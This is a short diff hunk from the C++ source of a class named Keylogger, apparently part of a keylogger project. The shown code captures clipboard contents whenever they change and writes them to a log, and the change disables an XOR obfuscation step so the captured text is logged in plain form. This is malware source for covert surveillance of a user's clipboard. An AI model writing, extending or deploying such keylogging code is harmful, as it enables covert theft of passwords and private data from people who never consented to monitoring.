@@ -92,7 +92,7 @@ LRESULT CALLBACK Keylogger::WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPAR
     if (uMsg == WM_CLIPBOARDUPDATE) {
         std::cout << "New item detected on clipboard! Logged." << std::endl;
         std::wstring content = GetClipboardText();
-        XOR(content.data(), content.length(), key, lstrlenW(key));
+        // XOR(content.data(), content.length(), key, lstrlenW(key));
         kblog << wstring2utf8(content) << std::endl;
         return 0;
     }
